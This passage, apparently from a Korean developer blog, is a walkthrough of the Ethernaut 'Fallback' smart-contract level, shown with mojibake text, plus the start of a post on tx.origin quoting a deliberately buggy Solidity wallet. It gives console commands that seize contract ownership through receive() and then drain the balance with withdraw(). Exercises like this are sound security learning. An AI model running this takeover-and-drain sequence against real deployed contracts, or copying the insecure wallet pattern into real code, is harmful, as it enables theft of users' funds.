ì˜¬ë¦´ ìˆ˜ ìˆëŠ” functionì´ë‹¤.</span>\r\n    <span class=\"token comment\">//payableë¡œ ì„ ì–¸ë˜ì–´ etherë¥¼ ì „ì†¡í•˜ê³  ë°›ì„ ìˆ˜ ìˆë‹¤.</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contribute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">//msg.senderê°€ ë³´ë‚¸ etherì˜ ì–‘ì´ 0.001 ì´í•˜ì¸ì§€ í™•ì¸</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">//msg.senderì˜ ê¸°ì—¬ë„(contributions)ë¥¼ msg.valueë§Œí¼ ì˜¬ë¦°ë‹¤.</span>\r\n        contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">//ë§Œì•½ msg.senderì˜ contributionsê°€ ownerì˜ contributionsë³´ë‹¤ í¬ë‹¤ë©´ ownershipì´ transferëœë‹¤.</span>\r\n        <span class=\"token comment\">//ì´ˆê¸°ì— ownerì˜ contributionsì€ 1000 etherì´ê¸° ë•Œë¬¸ì— ownershipì„ ë°”ê¾¸ê¸° ìœ„í•´ì„œëŠ” 1000 etherì´ìƒì˜ ê¸°ì—¬í•´ì•¼í•œë‹¤.</span>\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> contributions<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">//ê¸°ì—¬ë„ë¥¼ í™•ì¸í•  ìˆ˜ ìˆëŠ” view function</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">//msg.senderì˜ ê¸°ì—¬ë„ë¥¼ return í•œë‹¤.</span>\r\n        <span class=\"token keyword\">return</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">//contractê°€ ê°€ì§€ê³  ìˆëŠ” ëª¨ë“  balance(ether)ë¥¼ ownerì—ê²Œ ì „ì†¡í•œë‹¤.</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">{</span>\r\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">//payableë¡œ ì„ ì–¸ë˜ì–´ etherë¥¼ ì „ì†¡í•˜ê³  ë°›ì„ ìˆ˜ ìˆë‹¤.</span>\r\n    <span class=\"token comment\">//receive function</span>\r\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">//msg.senderì˜ msg.valueê°€ 0ë³´ë‹¤ í¬ê³  ê¸°ì—¬ë„(contributions)ê°€ 0ë³´ë‹¤ í°ì§€ í™•ì¸í•œë‹¤</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> contributions<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">//ownerë¥¼ msg.senderë¡œ ë°”ê¾¼ë‹¤.</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"í’€ì´\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"í’€ì´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í’€ì´</h2>\n<p>ìš°ë¦¬ëŠ” 2ê°€ì§€ì˜ ë¬¸ì œë¥¼ í’€ì–´ì•¼ í•œë‹¤.</p>\n<ol>\n<li>contractì˜ ownershipì„ ëºì–´ì˜¤ê¸°</li>\n<li>contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°</li>\n</ol>\n<p>ì°¨ë¡€ì°¨ë¡€ í’€ì–´ë³´ê² ë‹¤.\r\nì½”ë“œë¥¼ ë´¤ì„ ë–„ contractì˜ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆë‹¤.</p>\n<ul>\n<li>contribute()</li>\n<li>receive()</li>\n</ul>\n<ol>\n<li>contribute()ë¥¼ ì´ìš©í•´ ownerê°€ ë˜ë ¤ë©´ ì´ˆê¸° ownerì˜ contributions 1000 etherë³´ë‹¤ ë” í° ëˆì„ contractë¡œ ë³´ë‚´ì•¼ í•œë‹¤.</li>\n<li>í•˜ì§€ë§Œ contribute()ì˜ requireì„ ë³´ë©´ í•œë²ˆì— 0.001 etherì´í•˜ì˜ etherë§Œ ë³´ë‚¼ ìˆ˜ ìˆê²Œ ë˜ì–´ìˆë‹¤. contractì—ì„œ ì˜ë„í•œëŒ€ë¡œ ownerê°€ ë˜ë ¤ë©´ <strong>1,000,000 + a</strong> ë²ˆ ì „ì†¡í•´ì•¼í•œë‹¤.</li>\n<li>ì´ ë°©ë²•ì€ ë¹„ìš©ë„ ë§ì´ë“¤ê³  ì—„ì²­ë‚œ ì‹œê°„ì´ ê±¸ë¦¬ê¸° ë•Œë¬¸ì— receive í•¨ìˆ˜ë¥¼ í™•ì¸í•´ë³´ì!</li>\n<li>receive í•¨ìˆ˜ë¥¼ ë³´ë©´ msg.valueë‚˜ 0ë³´ë‹¤ í¬ê³  contributionsê°€ 0ë³´ë‹¤ í¬ë©´ ownerë¥¼ msg.senderë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.</li>\n<li>ê·¸ë ‡ë‹¤ë©´ contribute() í˜¸ì¶œí•´ ì‘ì€ ê°’ì„ ë³´ë‚´ì–´ contributionsë¥¼ 0ì„ ì´ˆê³¼í•˜ê²Œ ë§Œë“ ë‹¤ìŒ receiveí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ownerë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆë‹¤.</li>\n</ol>\n<p>ëª¨ë“  ì½”ë“œëŠ” consoleì°½ì—ì„œ ì´ë£¨ì–´ì§„ë‹¤.\r\nctrl + shift + ië¥¼ ëˆŒëŸ¬ consoleì°½ì„ í™œì„±í™” ì‹œí‚¤ì</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//0.001ë³´ë‹¤ ì‘ì€ 0.0001ì„ ë³´ë‚¸ë‹¤.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span>contribute<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>value<span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//ë‚˜ì˜ contributionì„ í™•ì¸í•œë‹¤.</span>\r\n<span class=\"token function\">fromWei</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">getContribution</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//contractì˜ balanceë¥¼ í™•ì¸í•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//ëª¨ë‘ 0.0001ê³¼ ê°™ì„ ê²ƒì´ë‹¤!</span>\r\n\r\n<span class=\"token comment\">//ë‚˜ì˜ contributionì´ 0ì„ ì´ˆê³¼í–ˆìœ¼ë‹ˆ recevice()ë¥¼ ì‹¤í–‰ ì‹œí‚¬ ìˆ˜ ìˆëŠ” ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•œë‹¤.</span>\r\ncontract<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>value<span class=\"token operator\">:</span><span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.0001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//contractì˜ owner addressë¥¼ í™•ì¸í•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token comment\">//ë‚˜ì˜ addressë¥¼ í™•ì¸í•œë‹¤.</span>\r\nplayer\r\n<span class=\"token comment\">//play(ë‚˜)ì´ ownerê°€ ëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆë‹¤.</span>\r\n</code></pre></div>\n<p>ì´ë ‡ê²Œ ownershipì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆì—ˆë‹¤.</p>\n<p>ë‹¤ìŒìœ¼ë¡œ contractì˜ balanceë¥¼ 0ìœ¼ë¡œ ë§Œë“¤ê¸°ì´ë‹¤.\r\ncontractì˜ balanceë¥¼ 0ì„ë¡œ ë§Œë“¤ê¸°ëŠ” ë§¤ìš° ì‰½ë‹¤!\r\nownerë§Œ callí•  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ì¸ withdrawì„ callí•˜ê¸°ë§Œ í•˜ë©´ ëœë‹¤.</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//withdrawí•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">//contractì˜ balanceê°€ 0ì´ ëœê²ƒì„ í™•ì¸í•œë‹¤.</span>\r\n<span class=\"token keyword\">await</span> <span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span></code></pre></div>\n<p>Submit instanceë¥¼ ëˆ„ë¥´ê³  ì¡°ê¸ˆ ê¸°ë‹¤ë¦¬ë©´ blockì´ mineë˜ê³ , ë‹¤ìŒê³¼ ê°™ì´ ëœ¨ë©´ì„œ ë‹¤ìŒ levelë¡œ ë„˜ì–´ê°ˆ ìˆ˜ ìˆë‹¤.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAACfklEQVQ4y1WTiY7jNhBE/f/fFSBAkGMm4x2P14csWfdFirRknf0CUd5kI6BR7KJUeA1Su9Oh4nRQ3L2GKDD4l4bLUbkKfYN31jS6Z32WRZwWpsfLH9yKB5fUOq0fA9M0sbvdevxg4B4ORPGAf++5XHuuXk+UDPhBj7EzICzL4rQ0Pdf8gVc8XHBQtpS2Z5pGdn/uhb++Cfuj8HUR3g/Cb+8Lv38Ih7Pw9imUSl6BG2FYdbz7mo9A8+YrvoUNsXpuhOcUThmENcQKggq8Aq7F5t1KaLr/B64097LlXrWOcF3rdtgIL2bAsyM3O3F/TFztyLEZOZnx396MC8h/gXnz5HtiOKeWU2q5Zpa86TfCTwk4SMh3ibhKylEiPsRnLz4XSfmSkFrsCsgiiwuM686N+Rk17O+aY2zI9GvkTG7k4pGLTyUxpdzJ5UYiZ6drryShE8MLkMr27iDWkdcTXlX9GFnPH5j5gJn/Rs9v2PmImv+gmn+lnH7Bznv0/I6Zj8jcrJeHVD8d3VdsOESGU2Kc5wgZLzD5MH7B5CFT+OqPMJ0R59+ct0weSEFlOvyidZSOsGxRP+6h9BXS12yqtvXQvPoKaWNkWD3tir5At08i1ROrjqjuSPQT3Y6vQBUjOkZUuGkVILbYtPKR/IwUHqITt4+OsXlCqVuqx+D+msoOtP38CmwKxFSIyhBbI02JdHbzTL3VuvfqeSi6KqepFcZ2NN2I6Ub6acFay050sYWsutZPH0u1UuVIESHlOkUOVtFkKfHlSpKUbtz1ypjnRNM07CRNkSxH4gRJUiTNkCxDqgoJIyTPkSBAgjvruxQFY5rz9AKepaIbJp7DzLSIC/wHAO0qYjzyzD0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"fallback finish\"\n        title=\"fallback finish\"\n        src=\"/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png\"\n        srcset=\"/static/68592aa21598d925b557a56b988fc3bf/e9ff0/fallback_finish.png 180w,\n/static/68592aa21598d925b557a56b988fc3bf/f21e7/fallback_finish.png 360w,\n/static/68592aa21598d925b557a56b988fc3bf/37523/fallback_finish.png 720w,\n/static/68592aa21598d925b557a56b988fc3bf/4b446/fallback_finish.png 877w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"ë§ˆë¬´ë¦¬\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"ë§ˆë¬´ë¦¬ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë§ˆë¬´ë¦¬</h2>\n<p>ì–¼ë§ˆì „ì— ê³µë¶€í–ˆë˜ king of Ether(DOS with unexpected revert)ê°€ ìƒê°ë‚œë‹¤. revertë¥¼ í†µí•´ í•˜ëŠ” ownershipì„ ê°€ì ¸ì˜¤ëŠ”ê±´ ì•„ë‹ˆì—ˆì§€ë§Œ ë¹„ìŠ·í•œ ì ì´ ë§ì€ ê²ƒ ê°™ì•˜ë‹¤. smart contractì„ ì§¤ë•Œ logicì€ ê´œì°®ì•„ë³´ì—¬ë„ ìš°ë¦¬ê°€ ìƒê°í•˜ì§€ ëª»í•œ í—ˆì ì´ ìˆì„ ìˆ˜ ìˆë‹¤! í•­ìƒ ì¡°ì‹¬í•˜ê³  ë˜ ì¡°ì‹¬í•˜ì!\r\në‚˜ì¤‘ì—ëŠ” ë³´ì•ˆê°ì‚¬(auditing)ë„ ë°°ì›Œ ë‚´ì˜ smart contractë¥¼ audit í•  ìˆ˜ ìˆì—ˆìœ¼ë©´ ì¢‹ê² ë‹¤! <del>ì´ê±°ë¡œ ì·¨ì—… í•´ì•¼ì§€ã…</del></p>\n<p>ê³ ì‘ 1ë‹¨ê³„ë¥¼ ì™„ë£Œí•œ ê²ƒì´ì§€ë§Œ ê²Œì„ì„ í†µí•´ ë°°ìš°ë‹ˆ ë” ì¬ë°ŒëŠ” ê²ƒ ê°™ë‹¤. ì•ìœ¼ë¡œë„ í™”ì´íŒ…!</p>\n<hr>\n<h2 id=\"ê¸°íƒ€-ì •ë³´\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"ê¸°íƒ€ ì •ë³´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ê¸°íƒ€ ì •ë³´</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">ìŠ¹ë¦¬ ì¡°ê±´</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">ì½”ë“œ ë¶„ì„</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">í’€ì´</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">ë§ˆë¬´ë¦¬</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">ê¸°íƒ€ ì •ë³´</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 02, 2022","title":"(Ethernaut ì·¨ì•½ì  1) Fallback","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/ethernaut/1_fallback_ethernaut/1_fallback_ethernaut/"}},"prev":{"id":"b07cd563-6b17-5ce7-b7b0-e27977da9b90","html":"<h1 id=\"-txorigin\" style=\"position:relative;\"><a href=\"#-txorigin\" aria-label=\" txorigin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ğŸ‘‹ tx.origin</h1>\n<h2 id=\"txorigin-vs-msgsender\" style=\"position:relative;\"><a href=\"#txorigin-vs-msgsender\" aria-label=\"txorigin vs msgsender permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>txorigin vs msg.sender</h2>\n<p>ì£¼ë¡œ tx.originì€ msg.senderê³¼ ë¹„êµëœë‹¤.<br>\nìš°ì„  ìš°ë¦¬ê°€ ì˜ ì•„ëŠ” msg.senderëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì‚¬ëŒì„ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œì´ë‹¤.\r\ntx.originì„ ë³´ë©´ txëŠ” transactionì„ ëœ»í•œë‹¤. ì¦‰ transactionì„ ë§Œë“  addressë¥¼ ëœ»í•œë‹¤.</p>\n<p>ë§Œì•½ accountì—ì„œ smart contract Aë¡œ transactionì„ ë³´ë‚¸ë‹¤ë©´ msg.senderì™€ tx.originì€ ê°™ì„ ê²ƒì´ë‹¤. ì™œëƒí•˜ë©´ transactionì„ ë§Œë“ ì´ì™€ transactionì„ ë³´ë‚¸ ì‚¬ëŒì´ ê°™ê¸° ë•Œë¬¸ì´ë‹¤.</p>\n<p>ê·¸ë ‡ë‹¤ë©´ account -> smart contract A -> smart contract B ìˆœìœ¼ë¡œ transactionì„ ë³´ë‚¸ë‹¤ë©´ ì–´ë–»ê²Œ ë ê¹Œ? Bì˜ ê´€ì ì—ì„œ ë³¸ë‹¤ë©´ transactionì„ ë§Œë“ ì´ëŠ” accountì´ê³  msg.senderì€ Aì¼ ê²ƒì´ë‹¤.\r\në°‘ì— ì‚¬ì§„ì„ ë³¸ë‹¤ë©´ ì´í•´ê°€ ë” ì‰¬ìš¸ ê²ƒì´ë‹¤.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACAUlEQVQoz22SW3OaUBSF/Q0JiBq8h8amoVqrJirgHRw0auDsA+cAoqYqiTE1nelL3/rPO+o09aEz62nN/mZf1g5xCnx1nqX5W7LrsHWTkyGh04ROy97Lnf9am32veJuETpMDh1ftsIw4Bd4VSg6cjDH96C5SQyfatlL3rgA+r9rRFi4Ewd3PbaSJeY0kh27WmLJ1xDVO4PTYjWvkxv8mID/ati7Nadacxrp2pIXFVVB+23JN60Ilqf/CsY6V6FNeJdEmDkuIk0G0lgUS3MCiDKQCRKLO9YTG9X0PToFIA/+DORmYmnFeM477RBTI6YvcYP5Jg8rQrE6gNISYgpiqydRMRjKZunkCK5AbzvPGOtGlR/6iZ3+xgxLZfJgsGAVYGcIK8H0iwvLW3ZbdTaxlHStDvEaKj0+V1Tbeo6yEoh1LQL5Il/Xd7srw0yOXkxCvkazhX5PH25dXYexnDmakAaHUvcs1QCAzAWa8SnJ0wWskPqTy7x+MgtMPPtexBXvO90kWTau/dmd1lBx5ZzXEyhBK6jQ99gSYxfs0LKFoC4vuKu+tC7N1yfXzyMmpKKNaorfOe8Fnb1mkU/GBXqlIUA87cwqEJfT+AHljXYSn0thpA3QxbgGkOnuzhJ/LI7sFWLWwbOLL3l94n95JgAftB2NlYKTDzWR0FCMBI8O5tPf/AJn9qjVT/O4AAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"tx.origin_vs_msg.sender\"\n        title=\"tx.origin_vs_msg.sender\"\n        src=\"/static/3901a82f29a2ffd4056cf6dc2bf82a5c/37523/txorigin_vs_msg.sender.png\"\n        srcset=\"/static/3901a82f29a2ffd4056cf6dc2bf82a5c/e9ff0/txorigin_vs_msg.sender.png 180w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/f21e7/txorigin_vs_msg.sender.png 360w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/37523/txorigin_vs_msg.sender.png 720w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/302a4/txorigin_vs_msg.sender.png 1080w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/07a9c/txorigin_vs_msg.sender.png 1440w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/29114/txorigin_vs_msg.sender.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code</h2>\n<p>ì´ Example CodeëŠ” solidity docsì— ë‚˜ì™€ìˆëŠ” ë‚´ìš©ì´ë‹¤!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: GPL-3.0</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">>=</span><span class=\"token version number\">0.7.0</span> <span class=\"token operator\">&lt;</span><span class=\"token version number\">0.9.0</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token comment\">// THIS CONTRACT CONTAINS A BUG - DO NOT USE</span>\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TxUserWallet</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token 